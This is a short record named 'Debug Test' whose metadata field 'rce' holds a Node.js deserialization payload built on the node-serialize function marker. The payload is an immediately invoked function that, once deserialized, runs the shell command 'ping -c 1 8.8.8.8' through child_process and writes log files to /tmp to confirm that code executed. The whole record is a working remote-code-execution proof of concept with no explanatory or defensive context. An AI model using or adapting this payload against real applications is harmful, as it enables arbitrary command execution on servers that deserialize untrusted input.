name: Debug Test
metadata: {"rce":"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/debug1.log', 'Starting exec test'); cp.exec('ping -c 1 8.8.8.8', function(error, stdout, stderr) { fs.writeFileSync('/tmp/debug2.log', 'Exec callback called'); if (error) { fs.writeFileSync('/tmp/error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/success.log', 'STDOUT: ' + stdout); } if (stderr) { fs.writeFileSync('/tmp/stderr.log', 'STDERR: ' + stderr); } }); } catch (e) { fs.writeFileSync('/tmp/exception.log', 'EXCEPTION: ' + e.message); } fs.writeFileSync('/tmp/debug3.log', 'Payload execution completed'); return '';}()"}
